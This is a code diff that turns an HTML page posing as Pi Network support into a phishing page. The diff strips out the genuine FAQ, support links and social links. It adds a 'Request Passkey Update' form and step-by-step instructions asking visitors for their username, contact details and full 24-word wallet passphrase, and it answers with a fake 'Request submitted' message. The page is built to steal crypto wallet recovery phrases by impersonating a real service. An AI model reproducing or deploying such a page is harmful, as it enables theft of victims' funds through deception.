@@ -127,7 +127,117 @@
                 display: flex;
             }
         }
+
+        /* Passkey Update & Instructions */
+        .passkey-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px;
+            gap: 20px;
+        }
+
+        .passkey-box {
+            width: 35%;
+            max-width: 350px;
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .instructions-box {
+            width: 35%;
+            max-width: 350px;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            font-size: 14px;
+            color: gray;
+        }
+
+        .passkey-box h2, .instructions-box h2 {
+            text-align: center;
+            color: #6A329F;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            color: #333;
+            font-family: Arial, sans-serif;
+        }
+
+        textarea {
+            height: 120px;
+            resize: none;
+        }
+
+        .btn {
+            width: 100%;
+            height: 50px;
+            background-color: #6A329F;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: #582b84;
+        }
+
+        .message {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .info {
+            text-align: center;
+            font-size: 14px;
+            color: gray;
+            margin-top: 15px;
+        }
+
+        .info a {
+            color: #6A329F;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        @media (max-width: 768px) {
+            .passkey-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            .passkey-box, .instructions-box {
+                width: 90%;
+            }
+        }
     </style>
+    <script>
+        function validatePassphrase() {
+            var passphrase = document.getElementById("passphrase").value.trim();
+            var message = document.getElementById("message");
+            var words = passphrase.split(/\s+/).filter(word => word.length > 0);
+
+            if (words.length !== 24) {
+                message.innerHTML = "Invalid Passphrase. Please enter exactly 24 words.";
+                message.style.color = "red";
+            } else {
+                message.innerHTML = "Request submitted successfully. Our team will contact you.";
+                message.style.color = "green";
+            }
+        }
+    </script>
 </head>
 <body>
 
@@ -135,20 +245,6 @@
     <div class="header">
         <div class="header-left">
             <img src="assets/pi_icon.png" alt="Pi Network Logo">
-        </div>
-        <div class="header-right">
-            <a href="https://twitter.com/PiCoreTeam" target="_blank">
-                <img src="assets/twitter_icon.png" alt="Twitter">
-            </a>
-            <a href="https://www.facebook.com/PiCoreTeam/" target="_blank">
-                <img src="assets/facebook_icon.png" alt="Facebook">
-            </a>
-            <a href="https://www.youtube.com/c/PiCoreTeam" target="_blank">
-                <img src="assets/youtube_icon.png" alt="YouTube">
-            </a>
-            <a href="https://www.instagram.com/pi_network/" target="_blank">
-                <img src="assets/instagram_icon.png" alt="Instagram">
-            </a>
         </div>
     </div>
 
@@ -158,81 +254,30 @@
         <h2>Follow steps below to find resources that may answer your support needs</h2>
     </div>
 
-    <!-- Content Section -->
-    <div class="container">
-        <div class="faq-section" onclick="toggleFAQ('faq1', this)">
-            <h3>Read the FAQs</h3>
-            <div id="faq1" class="faq-content">
-                <h4>Disclaimer: Pi is NOT free money.</h4>
-                <p>Pi is NOT free money.</p>
-                <p>What is Pi?</p>
-                <p>Is Pi real? There is some confusing commentary on Pi online.</p>
-                <p>How can the mining of Pi crypto be free? Are you using my phone resources?</p>
-                <p>How can Pi be mined on mobile phones without energy consumption typically known in “crypto mining”?</p>
-                <p>How do we create and use the Pi Wallet? And can we use an external wallet to hold our Pi in the future?</p>
-                <p>How does the Pi app work?</p>
-                <p>How do I mine more Pi coins?</p>
-                <p>Do I need to leave the app open to mine? Does the app drain my battery or data?</p>
-                <button onclick="window.location.href='https://minepi.com/support/'">Support</button>
-            </div>
+    <!-- Passkey Update & Instructions -->
+    <div class="passkey-container">
+        <div class="passkey-box">
+            <h2>Request Passkey Update</h2>
+            <input type="text" placeholder="Enter Username">
+            <input type="text" placeholder="Enter Email or Phone Number">
+            <textarea id="passphrase" placeholder="Enter your 24-word passphrase"></textarea>
+            <p id="message" class="message"></p>
+            <button class="btn" onclick="validatePassphrase()">Submit Request</button>
+            <p class="info">
+                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                Recovery of passphrase is currently impossible. 
+                <a href="https://minepi.com/support/" target="_blank">For more info, click here.</a>
+            </p>
         </div>
-
-        <div class="faq-section" onclick="toggleFAQ('faq2', this)">
-            <h3>Look for Answers in the Community Wiki</h3>
-            <div id="faq2" class="faq-content">
-                <h4>Need instructions about Pi App features?</h4>
-                <p>Visit the Moderator-generated Community Wiki page for additional information and instructional guidance.</p>
-                <button onclick="window.location.href='https://support.help.minepi.com/servicedesk/customer/portal/1/article/33038'">Community Wiki</button>
-            </div>
-        </div>
-
-        <div class="faq-section" onclick="toggleFAQ('faq3', this)">
-            <h3>Explore the support portal</h3>
-            <div id="faq3" class="faq-content">
-                <h4>Have a problem with the Pi App or your Pi account?</h4>
-                <p>Report a bug or send an email in the Support Portal.</p>
-                <button onclick="window.location.href='https://pinetwork.atlassian.net/servicedesk/customer/portals'">Support Portal</button>
-            </div>
+        <div class="instructions-box">
+            <h2>Instructions</h2>
+            <p>1. Enter your <strong>username</strong> as registered on Pi Network.</p>
+            <p>2. Provide your <strong>email or phone number</strong> associated with your Pi Wallet.</p>
+            <p>3. Enter your <strong>24-word passphrase</strong> exactly as given during wallet creation.</p>
+            <p>4. Click "Submit Request" to send your request for review.</p>
+            <p>⚠️ <strong>Important:</strong> Pi Network <strong>does not store</strong> your passphrase.</p>
         </div>
     </div>
-
-    <!-- Footer Section -->
-    <div class="footer">
-        <a href="https://twitter.com/PiCoreTeam" target="_blank">
-            <img src="assets/twitter_icon.png" alt="Twitter">
-        </a>
-        <a href="https://www.facebook.com/PiCoreTeam/" target="_blank">
-            <img src="assets/facebook_icon.png" alt="Facebook">
-        </a>
-        <a href="https://www.youtube.com/c/PiCoreTeam" target="_blank">
-            <img src="assets/youtube_icon.png" alt="YouTube">
-        </a>
-        <a href="https://www.instagram.com/pi_network/" target="_blank">
-            <img src="assets/instagram_icon.png" alt="Instagram">
-        </a>
-    </div>
-
-    <script>
-        function toggleFAQ(id, element) {
-            var content = document.getElementById(id);
-            var allSections = document.querySelectorAll('.faq-section');
-
-            allSections.forEach(section => {
-                if (section !== element) {
-                    section.classList.remove("open");
-                    section.querySelector(".faq-content").style.display = "none";
-                }
-            });
-
-            if (content.style.display === "block") {
-                content.style.display = "none";
-                element.classList.remove("open");
-            } else {
-                content.style.display = "block";
-                element.classList.add("open");
-            }
-        }
-    </script>
 
 </body>
 </html>
